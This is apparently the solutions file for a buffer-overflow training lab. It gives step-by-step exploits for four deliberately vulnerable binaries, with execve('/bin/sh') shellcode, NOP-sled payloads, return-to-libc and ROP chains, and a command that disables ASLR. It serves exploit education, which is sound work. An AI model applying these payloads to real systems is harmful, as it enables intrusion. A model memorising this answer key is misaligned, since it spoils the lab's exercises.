# Solutions and Hints

**SPOILER WARNING**: Try to solve the challenges yourself first! The learning is in the struggle.

---

## Level 1: Basic Buffer Overflow

### Concept
When a buffer on the stack is overflowed, it can overwrite adjacent variables. The stack grows downward, but buffers fill upward, so overflow data overwrites variables declared after the buffer.

### Understanding the Stack Layout

```
High Memory
+------------------+
| auth (4 bytes)   | <- Target to overwrite
+------------------+
| padding/align    | <- May exist depending on compiler
+------------------+
| buffer[64]       | <- Start overflowing here
+------------------+
Low Memory
```

### Hints

1. Run the program normally first to see the addresses:
   ```bash
   ./vuln1 "AAAA"
   ```

2. Note the addresses of buffer and auth - calculate the distance

3. Fill the buffer completely (64 bytes) then add the target value

4. Remember x86/x64 is **little-endian**: `0xdeadbeef` → `\xef\xbe\xad\xde`

5. You need: 64 bytes (fill buffer) + padding (if any) + 4 bytes (`0xdeadbeef`)

### Step-by-Step Solution

```bash
# Step 1: Test with simple input
./vuln1 "AAAA"

# Step 2: Overflow with many A's to see what happens
./vuln1 $(python3 -c 'print("A"*100)')

# Step 3: Calculate exact offset (usually 64 bytes for buffer)
# Try 64 A's + deadbeef
./vuln1 $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\xef\xbe\xad\xde")')

# If that doesn't work, try accounting for padding:
./vuln1 $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*68 + b"\xef\xbe\xad\xde")')
```

### Using GDB to Find Exact Offset

```bash
gdb ./vuln1

(gdb) break vulnerable_function
(gdb) run "AAAA"
(gdb) info locals
# Note the addresses of buffer and auth

(gdb) print &auth - &buffer
# This gives you the exact offset
```

### Expected Output
```
*** SUCCESS! You've overwritten auth correctly! ***
```

---

## Level 2: Overwriting Return Address

### Concept
The return address is stored on the stack after the saved base pointer. By overwriting it, you can redirect execution to any address in memory.

### Stack Frame Layout

```
Higher addresses
+------------------+
| Return address   | <- Overwrite this with secret_function address
+------------------+
| Saved EBP/RBP    | <- Saved base pointer (4/8 bytes)
+------------------+
| buffer[64]       | <- Start here
+------------------+
Lower addresses
```

### Hints

1. The program prints the address of `secret_function` - use that address

2. You need to overflow past:
   - The buffer (64 bytes)
   - Saved base pointer (4 bytes on 32-bit, 8 bytes on 64-bit)
   - Then overwrite the return address

3. For 32-bit: 64 + 4 = 68 bytes padding, then the address
   For 64-bit: 64 + 8 = 72 bytes padding, then the address

4. Don't forget little-endian byte order!

### Step-by-Step Solution (32-bit)

```bash
# Step 1: Run to get address of secret_function
./vuln2 "test"
# Note: secret_function is at 0x08048456 (example)

# Step 2: Create payload
# 64 bytes (buffer) + 4 bytes (saved EBP) + 4 bytes (return address)
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*68 + b"\x56\x84\x04\x08")' > payload

# Step 3: Run with payload
./vuln2 "$(cat payload)"
```

### Step-by-Step Solution (64-bit)

```bash
# Step 1: Get address
./vuln2 "test"
# Note: secret_function is at 0x401156 (example)

# Step 2: Create payload - 64-bit addresses are 8 bytes
# 64 bytes (buffer) + 8 bytes (saved RBP) + 8 bytes (return address)
python3 << 'EOF' > payload
import struct
padding = b"A" * 72
ret_addr = struct.pack("<Q", 0x401156)  # Use actual address from step 1
sys.stdout.buffer.write(padding + ret_addr)
EOF

# Step 3: Run
./vuln2 "$(cat payload)"
```

### Finding the Exact Offset with Pattern

```bash
# Generate a unique pattern
gdb ./vuln2
(gdb) run $(python3 -c 'print("A"*64 + "B"*8 + "C"*8)')

# See where it crashes and what's in EIP/RIP
(gdb) info registers
# If EIP/RIP contains "CCCC" or similar, you found the offset
```

### Expected Output
```
*** CONGRATULATIONS! ***
You've successfully redirected execution to secret_function()!
```

---

## Level 3: Shellcode Injection

### Concept
Instead of redirecting to existing functions, inject your own machine code (shellcode) and redirect execution to it. A NOP sled makes it easier to land in your shellcode.

### Attack Strategy

```
Buffer layout:
+------------------+
| NOP sled         | <- Many 0x90 (NOP) instructions
| (100-200 bytes)  |    Jump anywhere in here works!
+------------------+
| Shellcode        | <- Actual malicious code
| (25-50 bytes)    |    Spawns shell
+------------------+
| Padding          | <- Fill to return address
+------------------+
| Return address   | <- Point to middle of NOP sled
+------------------+
```

### Shellcode (Linux x86 execve("/bin/sh"))

```python
# 32-bit shellcode (25 bytes)
shellcode_32 = (
    b"\x31\xc0"              # xor eax, eax
    b"\x50"                  # push eax
    b"\x68\x2f\x2f\x73\x68"  # push 0x68732f2f ('/sh')
    b"\x68\x2f\x62\x69\x6e"  # push 0x6e69622f ('/bin')
    b"\x89\xe3"              # mov ebx, esp
    b"\x50"                  # push eax
    b"\x53"                  # push ebx
    b"\x89\xe1"              # mov ecx, esp
    b"\x99"                  # cdq
    b"\xb0\x0b"              # mov al, 0x0b
    b"\xcd\x80"              # int 0x80
)

# 64-bit shellcode (27 bytes)
shellcode_64 = (
    b"\x48\x31\xd2"                          # xor rdx, rdx
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  # mov rbx, 0x68732f6e69622f2f
    b"\x48\xc1\xeb\x08"                      # shr rbx, 0x8
    b"\x53"                                  # push rbx
    b"\x48\x89\xe7"                          # mov rdi, rsp
    b"\x50"                                  # push rax
    b"\x57"                                  # push rdi
    b"\x48\x89\xe6"                          # mov rsi, rsp
    b"\xb0\x3b"                              # mov al, 0x3b
    b"\x0f\x05"                              # syscall
)
```

### Step-by-Step Solution (32-bit)

```python
#!/usr/bin/env python3
import struct
import sys

# Shellcode: execve("/bin/sh")
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)

# Build payload
nop_sled = b"\x90" * 200               # NOP sled
payload = nop_sled + shellcode         # NOP + shellcode

# Calculate padding
# Buffer is 512 bytes, need to reach return address
# 512 (buffer) + 4 (saved EBP) = 516
padding_needed = 516 - len(payload)
if padding_needed > 0:
    payload += b"A" * padding_needed

# Return address: point to middle of buffer
# Get this from running the program - it prints buffer address
buffer_addr = 0xbffff000  # REPLACE WITH ACTUAL ADDRESS + ~100
ret_addr = struct.pack("<I", buffer_addr + 100)

payload += ret_addr

sys.stdout.buffer.write(payload)
```

### Running the Exploit

```bash
# Step 1: Get buffer address
./vuln3 "test"
# Buffer is at: 0xbffff6c0 (example)

# Step 2: Update exploit script with buffer address

# Step 3: Run exploit
./vuln3 "$(python3 exploit.py)"

# You should get a shell!
$ whoami
$ exit
```

### Debugging Tips

```bash
# Use GDB to verify shellcode location
gdb ./vuln3
(gdb) break *vulnerable_function+50  # After strcpy
(gdb) run "$(python3 exploit.py)"
(gdb) x/100i $buffer_address  # Disassemble to see NOP sled and shellcode
(gdb) x/100xb $buffer_address # View as hex bytes
```

### Common Issues

1. **Segmentation fault**: Return address is wrong
   - Verify buffer address is correct
   - Try different offsets (±50 bytes)

2. **Illegal instruction**: Jumped to wrong location
   - Make NOP sled bigger
   - Point to middle of NOP sled, not beginning

3. **No shell spawns**: Shellcode might be corrupted
   - Check for null bytes
   - Verify shellcode is copied correctly

### Expected Output
```
sh-4.2$ whoami
user
sh-4.2$ exit
```

---

## Level 4: Return-to-libc Attack

### Concept
When the stack is non-executable (NX/DEP), you can't execute shellcode. Instead, redirect to existing executable code in libc, like `system()`. Set up the stack to call `system("/bin/sh")`.

### Stack Frame for Function Call (32-bit)

```
Higher addresses
+------------------+
| "/bin/sh" addr   | <- Argument to system()
+------------------+
| exit() address   | <- Return address for system()
+------------------+
| system() address | <- Return address we overwrite
+------------------+
| Saved EBP        |
+------------------+
| buffer[128]      |
+------------------+
```

### Stack Frame for Function Call (64-bit)

64-bit uses registers for first 6 arguments (RDI, RSI, RDX, RCX, R8, R9), so we need ROP gadgets.

### Hints

1. The program helpfully prints addresses of `system()` and a "/bin/sh" string

2. For 32-bit: Set up fake stack frame
   - Overflow to return address
   - Place address of `system()`
   - Place address of `exit()` (or junk)
   - Place address of "/bin/sh" string

3. For 64-bit: Need to set RDI register (first argument)
   - Find a "pop rdi; ret" gadget
   - Use it to load "/bin/sh" address into RDI

4. Calculate buffer size: 128 bytes + saved base pointer

### Step-by-Step Solution (32-bit)

```python
#!/usr/bin/env python3
import struct
import sys

# Get these addresses from running the program
system_addr = 0xf7e13040   # Address of system()
exit_addr = 0xf7e05f00     # Address of exit()
binsh_addr = 0x08048710    # Address of "/bin/sh" string

# Build payload
padding = b"A" * 128       # Fill buffer
padding += b"BBBB"         # Overwrite saved EBP (4 bytes)

# Fake stack frame for system("/bin/sh")
payload = padding
payload += struct.pack("<I", system_addr)  # Return to system()
payload += struct.pack("<I", exit_addr)    # system() returns to exit()
payload += struct.pack("<I", binsh_addr)   # Argument: "/bin/sh"

sys.stdout.buffer.write(payload)
```

```bash
# Run to get addresses
./vuln4 "test"

# Update exploit script with those addresses
# Run exploit
./vuln4 "$(python3 exploit4.py)"
```

### Step-by-Step Solution (64-bit with ROP)

```python
#!/usr/bin/env python3
import struct
import sys

# Get these from running the program
system_addr = 0x7ffff7e13040
binsh_addr = 0x555555554710

# Find ROP gadget: pop rdi; ret
# Use: ROPgadget --binary vuln4 | grep "pop rdi"
pop_rdi_ret = 0x400723  # Example address

# Build payload
padding = b"A" * 128       # Fill buffer
padding += b"B" * 8        # Overwrite saved RBP (8 bytes on 64-bit)

# ROP chain
payload = padding
payload += struct.pack("<Q", pop_rdi_ret)  # pop rdi; ret
payload += struct.pack("<Q", binsh_addr)   # "/bin/sh" goes into rdi
payload += struct.pack("<Q", system_addr)  # call system()

sys.stdout.buffer.write(payload)
```

### Finding ROP Gadgets

```bash
# Install ROPgadget
pip install ropgadget

# Find useful gadgets
ROPgadget --binary vuln4 | grep "pop rdi"
ROPgadget --binary vuln4 | grep "pop rsi"

# Or use ropper
ropper --file vuln4 --search "pop rdi"
```

### Alternative: Using pwntools

```python
#!/usr/bin/env python3
from pwn import *

# Load binary
elf = ELF('./vuln4')
rop = ROP(elf)

# Find what we need
system_addr = elf.plt['system']  # Or use libc address
binsh_addr = next(elf.search(b'/bin/sh'))

# Build ROP chain (64-bit)
rop.rdi = binsh_addr  # Set first argument
rop.call(system_addr)

# Build payload
payload = b"A" * 128 + b"B" * 8  # Padding
payload += rop.chain()

# Write payload
sys.stdout.buffer.write(payload)
```

### Debugging with GDB

```bash
gdb ./vuln4

# Break after strcpy
(gdb) break *vulnerable_function+100
(gdb) run "$(python3 exploit4.py)"

# Check stack
(gdb) x/20wx $rsp  # (64-bit)
(gdb) x/20wx $esp  # (32-bit)

# Verify return address
(gdb) print system
(gdb) x/s 0x08048710  # Check "/bin/sh" string

# Step through return
(gdb) stepi
```

### ASLR Considerations

If ASLR is enabled, addresses will change each run:

```bash
# Disable ASLR temporarily
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Or use the provided addresses from the program output
# The program prints the addresses at runtime!
```

### Expected Output
```
sh-4.2$ whoami
user
sh-4.2$ exit
```

---

## General Tips for All Levels

### Debugging Strategy

1. **Start simple**: Can you crash the program?
2. **Find the offset**: Exactly how many bytes to reach your target?
3. **Test incrementally**: Change one thing at a time
4. **Use GDB**: Actually see what's on the stack
5. **Draw it out**: Visual representation helps

### Common Mistakes

1. **Wrong endianness**: Always use little-endian on x86/x64
2. **Off-by-one**: Count bytes carefully
3. **Null bytes**: `strcpy()` stops at `\x00`
4. **Wrong addresses**: Verify addresses from program output
5. **Wrong architecture**: 32-bit vs 64-bit matters!

### Verification Checklist

- [ ] Compiled with correct flags
- [ ] ASLR disabled (for learning)
- [ ] Calculated offset correctly
- [ ] Used correct endianness
- [ ] Verified addresses from program output
- [ ] Tested in GDB first
- [ ] Checked for null bytes in payload

### Advanced Techniques (Beyond These Exercises)

- **Format string + Buffer overflow combo**
- **Heap overflow**
- **Return-oriented programming (ROP) chains**
- **Bypassing stack canaries**
- **Information leaks to defeat ASLR**
- **Sigreturn-oriented programming (SROP)**

---

## Tools Quick Reference

```bash
# Compile with different protections
gcc -m32 -fno-stack-protector -z execstack -no-pie -g vuln.c -o vuln

# Generate patterns
python -c 'from pwn import *; print(cyclic(200))'

# Find offset from pattern
python -c 'from pwn import *; print(cyclic_find(0x61616171))'

# GDB with PEDA/GEF/pwndbg
gdb ./vuln
peda$ pattern create 200
peda$ pattern offset 0x61616171

# One-liner exploits
./vuln $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\xef\xbe\xad\xde")')

# Check security features
checksec --file=vuln

# Find ROP gadgets
ROPgadget --binary vuln | grep "pop rdi"
```

Remember: The goal is learning, not just getting the flag. Understand *why* each exploit works!
